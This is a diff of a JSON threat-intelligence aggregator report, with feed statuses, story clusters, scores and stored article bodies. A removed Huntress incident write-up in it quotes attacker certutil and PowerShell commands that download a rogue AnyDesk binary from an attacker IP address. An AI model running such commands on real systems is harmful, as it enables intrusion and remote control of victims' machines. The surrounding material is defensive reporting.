@@ -1,29 +1,15 @@
 {
-  "generated_at": "2026-09-24T22:11:20.643585+00:00",
+  "generated_at": "2026-09-25T01:20:15.810444+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_items": 2198,
   "feed_status": {
-    "Unit 42": {
-      "url": "https://unit42.paloaltonetworks.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
-    },
     "CrowdStrike": {
       "url": "https://www.crowdstrike.com/blog/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
-    },
-    "SentinelOne Labs": {
-      "url": "https://www.sentinelone.com/labs/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
     },
     "Microsoft Security Blog": {
       "url": "https://www.microsoft.com/en-us/security/blog/feed/",
@@ -32,6 +18,20 @@
       "item_count": 10,
       "in_window_count": 4
     },
+    "Unit 42": {
+      "url": "https://unit42.paloaltonetworks.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 2
+    },
+    "SentinelOne Labs": {
+      "url": "https://www.sentinelone.com/labs/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
     "Trend Micro Research": {
       "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
       "cohort": "threat_research_primary",
@@ -39,8 +39,8 @@
       "item_count": 25,
       "in_window_count": 0
     },
-    "Google Threat Analysis Group": {
-      "url": "https://blog.google/threat-analysis-group/rss/",
+    "Sekoia": {
+      "url": "https://blog.sekoia.io/feed/",
       "cohort": "threat_research_primary",
       "status": "parse_error",
       "item_count": 0,
@@ -53,8 +53,8 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Sekoia": {
-      "url": "https://blog.sekoia.io/feed/",
+    "Google Threat Analysis Group": {
+      "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
       "status": "parse_error",
       "item_count": 0,
@@ -66,6 +66,13 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 2
+    },
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Cisco Talos": {
       "url": "https://feeds.feedburner.com/feedburner/Talos",
@@ -81,20 +88,6 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 1
-    },
     "SANS Internet Storm Center": {
       "url": "https://isc.sans.edu/rssfeed_full.xml",
       "cohort": "government_authoritative",
@@ -102,25 +95,11 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
-    },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 50,
-      "in_window_count": 3
-    },
-    "Volexity": {
-      "url": "https://www.volexity.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
+      "item_count": 15,
       "in_window_count": 1
     },
     "ESET WeLiveSecurity": {
@@ -130,12 +109,47 @@
       "item_count": 100,
       "in_window_count": 3
     },
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 3
+    },
+    "Volexity": {
+      "url": "https://www.volexity.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 3
+    },
     "Red Canary": {
       "url": "https://redcanary.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 0
+    },
+    "PortSwigger Research": {
+      "url": "https://portswigger.net/research/rss",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 40,
+      "in_window_count": 1
     },
     "GitHub Security Lab": {
       "url": "https://github.blog/category/security/feed/",
@@ -149,20 +163,6 @@
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 78,
-      "in_window_count": 0
-    },
-    "PortSwigger Research": {
-      "url": "https://portswigger.net/research/rss",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 40,
-      "in_window_count": 1
-    },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 50,
       "in_window_count": 0
     },
     "watchTowr Labs": {
@@ -186,19 +186,19 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Proofpoint Threat Insight": {
-      "url": "https://www.proofpoint.com/us/rss.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
-    },
     "TrustedSec": {
       "url": "https://www.trustedsec.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 1
+    },
+    "Proofpoint Threat Insight": {
+      "url": "https://www.proofpoint.com/us/rss.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 3
     },
     "Active Countermeasures": {
       "url": "https://www.activecountermeasures.com/feed/",
@@ -226,7 +226,7 @@
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 30,
-      "in_window_count": 2
+      "in_window_count": 1
     },
     "Orca Security Research": {
       "url": "https://orca.security/resources/blog/feed/",
@@ -234,13 +234,6 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 6
-    },
-    "Permiso Security": {
-      "url": "https://permiso.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
     },
     "AWS Security Blog": {
       "url": "https://aws.amazon.com/blogs/security/feed/",
@@ -256,6 +249,20 @@
       "item_count": 100,
       "in_window_count": 8
     },
+    "Permiso Security": {
+      "url": "https://permiso.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 3
+    },
     "Google Cloud Threat Intelligence": {
       "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
       "cohort": "threat_research_primary",
@@ -268,28 +275,7 @@
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 100,
-      "in_window_count": 3
-    },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
-    },
-    "Cloudflare Security": {
-      "url": "https://blog.cloudflare.com/tag/security/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
-    "Protect AI": {
-      "url": "https://protectai.com/blog/rss.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
+      "in_window_count": 2
     },
     "Trail of Bits": {
       "url": "https://blog.trailofbits.com/feed/",
@@ -305,12 +291,19 @@
       "item_count": 100,
       "in_window_count": 3
     },
-    "OpenSSF Blog": {
-      "url": "https://openssf.org/feed/",
+    "Protect AI": {
+      "url": "https://protectai.com/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Cloudflare Security": {
+      "url": "https://blog.cloudflare.com/tag/security/rss/",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Cloudflare Radar": {
       "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
@@ -326,12 +319,19 @@
       "item_count": 100,
       "in_window_count": 3
     },
-    "Coveware": {
-      "url": "https://www.coveware.com/blog?format=rss",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
+    "OpenSSF Blog": {
+      "url": "https://openssf.org/feed/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 3
+    },
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 20
     },
     "Chainalysis": {
       "url": "https://www.chainalysis.com/blog/feed/",
@@ -340,12 +340,19 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
+    "Coveware": {
+      "url": "https://www.coveware.com/blog?format=rss",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "BleepingComputer": {
+      "url": "https://www.bleepingcomputer.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 20
+      "item_count": 15,
+      "in_window_count": 15
     },
     "Interconnects": {
       "url": "https://www.interconnects.ai/feed",
@@ -361,19 +368,12 @@
       "item_count": 5,
       "in_window_count": 5
     },
-    "BleepingComputer": {
-      "url": "https://www.bleepingcomputer.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 15
-    },
-    "GreyNoise": {
-      "url": "https://www.greynoise.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
+      "item_count": 30,
+      "in_window_count": 22
     },
     "SecurityWeek": {
       "url": "https://www.securityweek.com/feed/",
@@ -382,12 +382,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
-      "cohort": "ai_security_agentic_risk",
+    "CyberScoop": {
+      "url": "https://cyberscoop.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 30,
-      "in_window_count": 24
+      "item_count": 10,
+      "in_window_count": 10
     },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
@@ -396,12 +396,19 @@
       "item_count": 50,
       "in_window_count": 1
     },
-    "CyberScoop": {
-      "url": "https://cyberscoop.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
+    "GreyNoise": {
+      "url": "https://www.greynoise.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
+      "item_count": 100,
+      "in_window_count": 1
+    },
+    "AI Snake Oil": {
+      "url": "https://www.aisnakeoil.com/feed",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
     },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
@@ -417,12 +424,12 @@
       "item_count": 50,
       "in_window_count": 28
     },
-    "AI Snake Oil": {
-      "url": "https://www.aisnakeoil.com/feed",
-      "cohort": "ai_security_agentic_risk",
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
+      "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
+      "item_count": 15,
+      "in_window_count": 1
     },
     "Schneier on Security": {
       "url": "https://www.schneier.com/feed/atom/",
@@ -438,26 +445,12 @@
       "item_count": 100,
       "in_window_count": 100
     },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 1
-    },
     "Reddit r/cybersecurity": {
       "url": "https://www.reddit.com/r/cybersecurity/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
       "in_window_count": 0
-    },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 50
     },
     "Reddit r/blueteamsec": {
       "url": "https://www.reddit.com/r/blueteamsec/.rss",
@@ -466,22 +459,8 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Reddit r/sysadmin": {
       "url": "https://www.reddit.com/r/sysadmin/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -494,12 +473,19 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Reddit r/AskNetsec": {
-      "url": "https://www.reddit.com/r/AskNetsec/.rss",
-      "cohort": "reddit_practitioner_osint",
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
+      "item_count": 50,
+      "in_window_count": 50
+    },
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 2
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -508,12 +494,26 @@
       "item_count": 100,
       "in_window_count": 25
     },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
       "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "Reddit r/AskNetsec": {
+      "url": "https://www.reddit.com/r/AskNetsec/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Reddit r/netsec": {
       "url": "https://www.reddit.com/r/netsec/.rss",
@@ -555,7 +555,7 @@
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 100,
-      "in_window_count": 2
+      "in_window_count": 1
     },
     "Google Project Zero": {
       "url": "https://googleprojectzero.blogspot.com/feeds/posts/default",
@@ -685,13 +685,17 @@
       "anchor_signal": "Microsoft Defender",
       "theme_key": "microsoft-defender",
       "dominant_features": {
+        "affected_industries": [
+          "healthcare",
+          "financial_services"
+        ],
         "affected_products": [
           "Microsoft Defender"
         ]
       },
-      "cluster_count": 6,
-      "article_count": 8,
-      "cohesion": 0.386,
+      "cluster_count": 5,
+      "article_count": 7,
+      "cohesion": 0.47,
       "shared_strong_signals": [
         "Microsoft Defender"
       ],
@@ -702,16 +706,14 @@
         "bededcd553",
         "e033dbd67d",
         "96fd6e2eb3",
-        "61da9d90b7",
-        "313eff8055"
+        "61da9d90b7"
       ],
       "links": [
         "https://thehackernews.com/2026/09/researcher-drops-bigdiskbuster-zero-day.html",
         "https://www.microsoft.com/en-us/security/blog/2026/09/24/beyond-ransomware-tracking-storm-2570-consistent-tradecraft-across-deployments/",
         "https://www.microsoft.com/en-us/security/blog/2026/09/24/whats-new-in-microsoft-security-september-2026/",
         "https://www.microsoft.com/en-us/security/blog/2026/09/23/reimagining-the-soc-for-the-agentic-era-in-microsoft-defender/",
-        "https://www.microsoft.com/en-us/security/blog/2026/09/22/unmasking-eviltokens-getting-to-the-root-of-device-code-phishing/",
-        "https://www.huntress.com/blog/threat-actor-compiles-cryptominer"
+        "https://www.microsoft.com/en-us/security/blog/2026/09/22/unmasking-eviltokens-getting-to-the-root-of-device-code-phishing/"
       ]
     },
     {
@@ -846,7 +848,7 @@
       },
       "cluster_count": 3,
       "article_count": 3,
-      "cohesion": 0.203,
+      "cohesion": 0.2,
       "shared_strong_signals": [
         "CVE-2026-76460"
       ],
@@ -1013,18 +1015,63 @@
         "https://therecord.media/lawmakers-introduce-bill-for-voluntary-telecom-cyber-rules",
         "https://cyberscoop.com/senate-telecom-cybersecurity-resilience-act-salt-typhoon/"
       ]
+    },
+    {
+      "label": "CVE-2026-91843 exploitation activity",
+      "anchor_signal": "CVE-2026-91843",
+      "theme_key": "cve-2026-91843",
+      "dominant_features": {
+        "cve_ids": [
+          "CVE-2026-91843"
+        ]
+      },
+      "cluster_count": 2,
+      "article_count": 2,
+      "cohesion": 0.2,
+      "shared_strong_signals": [
+        "CVE-2026-91843"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "bf92f99cb9",
+        "df5a100cb0"
+      ],
+      "links": [
+        "https://research.checkpoint.com/2026/21st-september-threat-intelligence-report/",
+        "https://thehackernews.com/2026/09/check-point-warns-of-management-server.html"
+      ]
+    },
+    {
+      "label": "CVE-2026-85102 exploitation activity",
+      "anchor_signal": "CVE-2026-85102",
+      "theme_key": "cve-2026-85102",
+      "dominant_features": {
+        "cve_ids": [
+          "CVE-2026-85102"
+        ]
+      },
+      "cluster_count": 2,
+      "article_count": 2,
+      "cohesion": 0.2,
+      "shared_strong_signals": [
+        "CVE-2026-85102"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "df5a100cb0",
+        "7d316694da"
+      ],
+      "links": [
+        "https://thehackernews.com/2026/09/check-point-warns-of-management-server.html",
+        "https://www.bleepingcomputer.com/news/security/check-point-warns-of-hackers-exploiting-security-gateway-vpn-rce-flaw/"
+      ]
     }
   ],
   "forward_signals": {
     "novelty": {
-      "cves": [
-        {
-          "value": "CVE-2026-91766",
-          "cluster_id": "f2a0ec94a5",
-          "first_source": "Reddit r/netsec",
-          "first_published": "2026-09-24T20:19:24+00:00"
-        }
-      ],
+      "cves": [],
       "actors": [],
       "products": []
     },
@@ -2380,14 +2427,11 @@
       "in_window": true,
       "taxonomy": {
         "threat_categories": [
-          "ransomware_extortion",
           "data_breach"
         ],
         "actor_attribution": [],
         "affected_industries": [
-          "healthcare",
-          "financial_services",
-          "government"
+          "healthcare"
         ],
         "affected_products": [],
         "tools_used": [],
@@ -2401,9 +2445,7 @@
           "products": []
         }
       },
-      "score": 10,
-      "full_body": "Image: Tima Miroshnichenko / Pexels Astrana latest healthcare tech firm to report data breach to SEC The healthcare company Astrana warned regulators this week that a recent cyberattack exposed confidential information. The company filed a report with the Securities and Exchange Commission (SEC) on Tuesday evening about a recent incident in which hackers impersonated Astrana personnel and spoofed the company’s main corporate telephone number. The hackers contacted employees using the spoofed number and eventually were able to gain access to company servers. “Based on the current status of the Company’s ongoing investigation, the Company believes that certain private and/or confidential information maintained on the Company’s servers has been accessed and/or acquired without authorization,” Astrana said. The company did not respond to requests for comment about whether the incident involved ransomware. The report notes that, among several measures taken, the company had to restore “certain systems from clean backups.” Law enforcement has been notified of the attack alongside other state and federal regulators as well as customers. The report does not say how many customers were impacted or what kind of information was taken but notes that the “potential confidential and sensitive nature of the data” has made the incident material to the company’s financial position. Astrana warned that the attack may impact its “business strategy, operations, financial condition… providers, patients, counterparties and the Company’s reputation,” and more. While cyber insurance may cover some of the costs related to these issues, it is unclear whether it will be enough to make up the losses. Astrana is one of the largest healthcare tech companies in the U.S., reporting $972.5 million in revenue last quarter through the sale of its operations technology platform to about 20,000 medical providers. No hacking group has claimed the attack as of Wednesday afternoon, but the incident follows several data breaches involving healthcare technology companies. Electronic health records company Veradigm recently told the SEC about a data breach involving Social Security numbers and healthcare firms like Nutex , AnMed , Aesto , Baylor Genetics , CareCloud , Paylogix and Boston Scientific have all reported cyberattacks over the last six months. News News Briefs Cybercrime No previous article No new articles Jonathan Greig is a Breaking News Reporter at Recorded Future News. Jonathan has worked across the globe as a journalist since 2014. Before moving back to New York City, he worked for news outlets in South Africa, Jordan and Cambodia. He previously covered cybersecurity at ZDNet and TechRepublic.",
-      "fetch_status": "ok"
+      "score": 9
     },
     {
       "source": "Wiz Research",
@@ -2433,7 +2475,7 @@
           "products": []
         }
       },
-      "score": 9
+      "score": 8
     },
     {
       "source": "Huntress",
@@ -2448,40 +2490,20 @@
       "taxonomy": {
         "threat_categories": [],
         "actor_attribution": [],
-        "affected_industries": [
-          "critical_infrastructure"
-        ],
-        "affected_products": [
-          "Microsoft Defender",
-          "Anthropic/Claude"
-        ],
+        "affected_industries": [],
+        "affected_products": [],
         "tools_used": [],
-        "cve_ids": [
-          "CVE-2025-4632",
-          "CVE-2024-7399"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_2_operator",
-        "role_map": {
-          "Microsoft Defender": "target",
-          "Anthropic/Claude": "target",
-          "OpenAI/ChatGPT": "mention"
-        },
+        "role_map": {},
         "weak_tags": {
-          "products": [
-            [
-              "OpenAI/ChatGPT",
-              "mention",
-              0.31
-            ]
-          ]
+          "products": []
         }
       },
-      "score": 10,
-      "full_body": "Home Blog The Not So Silent Miner: Threat Actor Compiles Cryptominer on the Endpoint Published: September 24, 2026 The Not So Silent Miner: Threat Actor Compiles Cryptominer on the Endpoint By: Harlan Carvey Lindsey O'Donnell-Welch Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways Huntress recently observed a threat actor doing something unique post-compromise: instead of simply dropping a miner, they compiled one directly on the victim endpoint, tailoring the payload while generating unusually conspicuous EDR telemetry. The incident started with exploitation of a known Samsung MagicINFO flaw. Attackers then deployed a rogue AnyDesk instance (after three tries), created a new local admin account, and disabled Defender protections. While the miner compilation aspect of this attack is interesting, the incident shows why defenders should look beyond known miner binaries: repeated RMM downloads and unexpected compiler activity can reveal a compromise before the final payload runs. Background Huntress researchers recently came across a unique incident where, after gaining initial access via exploiting a known Samsung MagicINFO vulnerability and installing a rogue AnyDesk instance on the endpoint, among other things, the threat actor aimed to deploy a cryptominer. Cryptominers in incidents aren't uncommon, but what raised our eyebrows was that the actor in this incident compiled the cryptominer directly on the endpoint. They ran commands via Silent XMR Miner Builder.exe (a Windows builder for deploying a Monero, or XMR, cryptominer, commonly associated with the open-source SilentXMRMiner project) that executed several .NET Framework utilities and an array of C compilers. Compiling a cryptominer in this way on a victim's endpoint could have various advantages for a threat actor, including allowing them to customize based on the target environment (such as optimizing for the endpoint's CPU architecture). However, these processes also resulted in a significant spike in activity and was – ironically – quite noisy from an EDR telemetry perspective. The Incident Initial Access Early in September 2026, a managed endpoint was alerted for activity that originated from the Samsung MagicINFO Premium installation on the endpoint. Samsung MagicINFO is digital signage/content management software; Huntress has previously detailed post-exploitation activities for vulnerabilities that have been found in this platform. In this incident, the activity was reportedly associated with CVE-2025-4632 , a Samsung MagicINFO vulnerability enabling attackers to write an arbitrary file as system authority. This vulnerability was fixed in May 2025 (after an initial, earlier flaw CVE-2024-7399 was found to have an incomplete fix). In reporting the incident, the customer was informed of appropriate remediation actions. However, eight days later, the endpoint was again reported for different post-compromise activity, which was tied to the same access vector as the previous incident report. (Multiple) AnyDesk Install Attempts The initial detections were for attempts to download the AnyDesk RMM to the endpoint. It took the threat actor three times to download AnyDesk from 194.87.89[.]30 . At first, they tried to use certutil.exe : C:\\Windows\\System32\\cmd.exe /c certutil -urlcache -split -f http://194.87.89.30:8899/anydesk.exe C:\\ProgramData\\AnyDesk.exe 2>&1 However, this command was quickly removed by Microsoft Defender on the endpoint. The threat actor then tried to use a method involving PowerShell Invoke-WebRequest : C:\\Windows\\System32\\cmd.exe /c powershell -c Invoke-WebRequest -Uri \"\"http://194.87.89.30:8899/anydesk.exe\"\" -OutFile \"\"C:\\ProgramData\\AnyDesk.exe\"\" 2>& This was again detected and remediated by Microsoft Defender. Figure 1 illustrates the EDR detection for the actor's third attempt, which finally worked. Figure 1: Detection of AnyDesk being downloaded Notice the grandparent process tomcat9.exe here. That shows that the comm",
-      "fetch_status": "ok"
+      "score": 9
     },
     {
       "source": "Rapid7",
@@ -2525,7 +2547,7 @@
           "products": []
         }
       },
-      "score": 18,
+      "score": 17,
       "full_body": "Phishing When Business Email Compromise Starts Rewriting Reality Douglas McKee, Director, Vulnerability Intelligence Sep 24, 2026 | Last updated on Sep 24, 2026 | 6 min read DISCOVER RAPID7 MDR When Business Email Compromise Starts Rewriting Reality Table of contents When Business Email Compromise Starts Rewriting Reality DISCOVER RAPID7 MDR Table of contents Business Email Compromise (BEC) operates on a familiar playbook. Threat actors breach a mailbox, silently monitor operations, map approval chains, and ultimately exploit that access to divert funds or exfiltrate sensitive assets. This dynamic is central to our analysis as we kick off a series around Rapid7's collaborative research with Zimbra; upcoming installments will explore technical details and broader findings based within the Zimbra Collaboration Suite. Our investigation disrupted the traditional BEC model in unexpected ways. We uncovered over 50 vulnerabilities, and found that several allow attackers not just to observe environments, but to actively rewrite them by impersonating senders without credentials, controlling inbox visibility, and altering shared documents and calendars. Business Email Compromise in action: Digital abuse of trust None of this is theoretical for Zimbra. But don’t take my word for it, just ask Russia . CISA keeps putting Zimbra bugs into the Known Exploited Vulnerabilities catalog , and the last three years make the point on their own: CVE-2024-45519 , command injection in the postjournal service, unauthenticated command execution. Proofpoint saw attackers stuffing base64 payloads into CC fields on September 28, 2024. CISA added it to KEV on October 3. CVE-2025-27915 , stored XSS in the Classic Web Client, triggered by a crafted .ICS attachment. It is used as a zero-day against Brazilian military targets to steal mail and quietly set forwarding filters. It went into KEV in October, 2025. CVE-2026-73570 , unauthenticated command injection through SNMP notification handling. CISA added it on August 21 of this year and gave federal agencies three days. Shadowserver has been counting somewhere north of 260 compromised instances while hunting for exploitation artifacts. Go back further and the pattern holds. Rapid7 tracked widespread exploitation of CVE-2022-27925 and CVE-2022-37042 in 2022, a path traversal chained with an authentication bypass that let attackers drop a JSP shell on a Zimbra server without credentials. Google's Threat Analysis Group later documented four separate threat groups working the same zero-day known as CVE-2023-37580. Each of these groups went after email, credentials, and authentication tokens. Attackers figured out a long time ago that the system sitting in the middle of everyone's communication is worth the effort. So when you find a set of bugs that let you write to that system instead of only reading from it, data theft stops being the interesting part. Send an email as your CFO without ever touching their password, and you have the front half of a very convincing BEC. Keep control of the mailbox afterward and you have the back half, too. Here, the attacker has a strategic choice. They can delete the sent message to hide their tracks, effectively wiping the trail of the fraud OR they can choose to leave the message in the Sent Items folder. By doing so, they ensure the CFO sees 'evidence' of the email they supposedly sent, creating a gaslighting scenario where the victim is left questioning their own actions. Whether the attacker cleans up or leaves the trail, they are shaping the organization’s perception of reality. In the ensuing investigation, where Finance sees a sent request and the CFO sees no such activity, the organization is trapped in a conflict of evidence. At that point, BEC looks less like traditional fraud and more like a psychological operation. Documents make it worse, as Zimbra is not just a mail server. The collaboration side holds the files employees actually use to make decisions. An attacker",
       "fetch_status": "ok"
     },
@@ -2559,7 +2581,7 @@
           "products": []
         }
       },
-      "score": 9
+      "score": 8
     },
     {
       "source": "Dark Reading",
@@ -2587,7 +2609,7 @@
           "products": []
         }
       },
-      "score": 6
+      "score": 5
     },
     {
       "source": "Help Net Security",
@@ -2621,7 +2643,7 @@
           "products": []
         }
       },
-      "score": 6
+      "score": 5
     },
     {
       "source": "Infosecurity Magazine",
@@ -2649,7 +2671,7 @@
           "products": []
         }
       },
-      "score": 6
+      "score": 5
     },
     {
       "source": "SecurityWeek",
@@ -2677,7 +2699,7 @@
           "products": []
         }
       },
-      "score": 6
+      "score": 5
     },
     {
       "source": "Graham Cluley",
@@ -2707,7 +2729,7 @@
           "products": []
         }
       },
-      "score": 7
+      "score": 6
     },
     {
       "source": "Help Net Security",
@@ -2763,7 +2785,7 @@
           "products": []
         }
       },
-      "score": 6
+      "score": 5
     },
     {
       "source": "Sysdig",
@@ -2803,7 +2825,7 @@
           ]
         }
       },
-      "score": 15,
+      "score": 14,
